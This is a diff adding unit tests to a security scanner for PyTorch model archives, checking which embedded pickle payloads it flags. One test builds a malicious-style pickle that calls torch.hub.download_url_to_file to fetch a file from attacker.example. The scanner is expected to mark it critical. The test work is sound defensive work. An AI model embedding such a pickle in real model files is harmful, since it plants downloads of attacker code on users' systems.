@@ -8031,6 +8031,7 @@ def test_pytorch_zip_allows_inert_pickle_url_literals_without_critical_s310(tmp_
             "license": "https://ultralytics.com/license",
             "docs": "https://docs.ultralytics.com/reference/os.system(command)",
             "api_docs": "https://docs.example.invalid/reference/requests.get(url)",
+            "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
             "repository": "https://github.com/ultralytics/ultralytics",
         },
         protocol=0,
@@ -8042,6 +8043,10 @@ def test_pytorch_zip_allows_inert_pickle_url_literals_without_critical_s310(tmp_
 
     assert result.success is True
     assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    assert not any(
+        issue.details.get("type") == "network_library" and issue.severity == IssueSeverity.CRITICAL
+        for issue in result.issues
+    )
 
 
 def test_pytorch_zip_keeps_code_after_url_literal_actionable(tmp_path: Path) -> None:
@@ -8160,6 +8165,41 @@ def test_pytorch_zip_keeps_network_url_reducer_actionable(tmp_path: Path) -> Non
         issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
         and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+
+
+def test_pytorch_zip_allows_url_literal_in_safe_reducer_without_critical_s310(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "safe-url-reducer.pt", with_pickle=False, prefix="archive")
+    payload = b"cbuiltins\nstr\n(Vhttps://ultralytics.com/license\ntR."
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_pytorch_zip_keeps_torch_hub_download_url_reducer_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "torch-url-reducer.pt", with_pickle=False, prefix="archive")
+    payload = b"ctorch.hub\ndownload_url_to_file\n(Vhttps://attacker.example/payload\nV/tmp/model.bin\ntR."
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("associated_global") == "torch.hub.download_url_to_file"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
 
